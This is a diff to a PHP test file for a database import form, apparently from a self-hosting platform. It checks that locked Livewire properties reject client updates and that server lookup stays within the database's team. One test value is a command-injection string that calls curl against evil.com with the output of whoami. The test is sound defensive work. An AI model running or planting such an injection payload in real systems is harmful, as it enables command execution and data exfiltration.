@@ -1,8 +1,21 @@
 <?php
 
 use App\Livewire\Project\Database\ImportForm;
+use App\Models\Environment;
+use App\Models\InstanceSettings;
+use App\Models\Project;
+use App\Models\Server;
+use App\Models\StandaloneDocker;
+use App\Models\StandalonePostgresql;
+use App\Models\Team;
+use App\Models\User;
 use App\Support\ValidationPatterns;
-use Livewire\Attributes\Locked;
+use Illuminate\Foundation\Testing\RefreshDatabase;
+use Illuminate\Support\Str;
+use Livewire\Features\SupportLockedProperties\CannotUpdateLockedPropertyException;
+use Livewire\Livewire;
+
+uses(RefreshDatabase::class);
 
 describe('container name validation', function () {
     test('isValidContainerName accepts valid container names', function () {
@@ -45,60 +58,60 @@ describe('container name validation', function () {
 });
 
 describe('locked properties', function () {
-    test('container property has Locked attribute', function () {
-        $property = new ReflectionProperty(ImportForm::class, 'container');
-        $attributes = $property->getAttributes(Locked::class);
+    beforeEach(function () {
+        InstanceSettings::forceCreate(['id' => 0]);
 
-        expect($attributes)->not->toBeEmpty();
+        $team = Team::factory()->create();
+        $user = User::factory()->create();
+        $team->members()->attach($user, ['role' => 'admin']);
+        $this->actingAs($user);
+        session(['currentTeam' => $team]);
+
+        $server = Server::factory()->create(['team_id' => $team->id]);
+        $destination = StandaloneDocker::firstOrCreate(
+            ['server_id' => $server->id, 'network' => 'coolify'],
+            ['uuid' => (string) Str::uuid(), 'name' => 'docker']
+        );
+        $project = Project::factory()->create(['team_id' => $team->id]);
+        $environment = Environment::factory()->create(['project_id' => $project->id]);
+        $this->database = StandalonePostgresql::create([
+            'uuid' => (string) Str::uuid(),
+            'name' => 'db',
+            'postgres_user' => 'postgres',
+            'postgres_password' => 'password',
+            'postgres_db' => 'db',
+            'image' => 'postgres:17',
+            'status' => 'running',
+            'environment_id' => $environment->id,
+            'destination_id' => $destination->id,
+            'destination_type' => $destination->getMorphClass(),
+        ]);
     });
 
-    test('serverId property has Locked attribute', function () {
-        $property = new ReflectionProperty(ImportForm::class, 'serverId');
-        $attributes = $property->getAttributes(Locked::class);
+    test('rejects client updates to locked property', function (string $property, mixed $value) {
+        Livewire::test(ImportForm::class, ['resource' => $this->database])
+            ->set($property, $value);
+    })->with([
+        'container' => ['container', '$(curl http://evil.com/$(whoami))'],
+        'serverId' => ['serverId', 999],
+        'resourceId' => ['resourceId', 999],
+        'resourceType' => ['resourceType', Server::class],
+        'resourceUuid' => ['resourceUuid', 'other-uuid'],
+        'resourceDbType' => ['resourceDbType', 'standalone-mysql'],
+    ])->throws(CannotUpdateLockedPropertyException::class);
 
-        expect($attributes)->not->toBeEmpty();
-    });
+    test('server is scoped to the team of the database', function () {
+        $ownServer = $this->database->destination->server;
+        $otherServer = Server::factory()->create(['team_id' => Team::factory()->create()->id]);
 
-    test('resourceId property has Locked attribute', function () {
-        $property = new ReflectionProperty(ImportForm::class, 'resourceId');
-        $attributes = $property->getAttributes(Locked::class);
+        $form = new ImportForm;
+        $form->resourceId = $this->database->id;
+        $form->resourceType = $this->database->getMorphClass();
 
-        expect($attributes)->not->toBeEmpty();
-    });
+        $form->serverId = $ownServer->id;
+        expect($form->server()?->id)->toBe($ownServer->id);
 
-    test('resourceType property has Locked attribute', function () {
-        $property = new ReflectionProperty(ImportForm::class, 'resourceType');
-        $attributes = $property->getAttributes(Locked::class);
-
-        expect($attributes)->not->toBeEmpty();
-    });
-
-    test('resourceUuid property has Locked attribute', function () {
-        $property = new ReflectionProperty(ImportForm::class, 'resourceUuid');
-        $attributes = $property->getAttributes(Locked::class);
-
-        expect($attributes)->not->toBeEmpty();
-    });
-
-    test('resourceDbType property has Locked attribute', function () {
-        $property = new ReflectionProperty(ImportForm::class, 'resourceDbType');
-        $attributes = $property->getAttributes(Locked::class);
-
-        expect($attributes)->not->toBeEmpty();
-    });
-});
-
-describe('server method uses team scoping', function () {
-    test('server computed property is scoped to the database team', function () {
-        $method = new ReflectionMethod(ImportForm::class, 'server');
-
-        // Extract the server method body
-        $startLine = $method->getStartLine();
-        $endLine = $method->getEndLine();
-        $lines = array_slice(file($method->getFileName()), $startLine - 1, $endLine - $startLine + 1);
-        $methodBody = implode('', $lines);
-
-        expect($methodBody)->toContain('where(\'team_id\', $this->resourceTeamId())');
-        expect($methodBody)->not->toContain('Server::find($this->serverId)');
+        $form->serverId = $otherServer->id;
+        expect($form->server())->toBeNull();
     });
 });
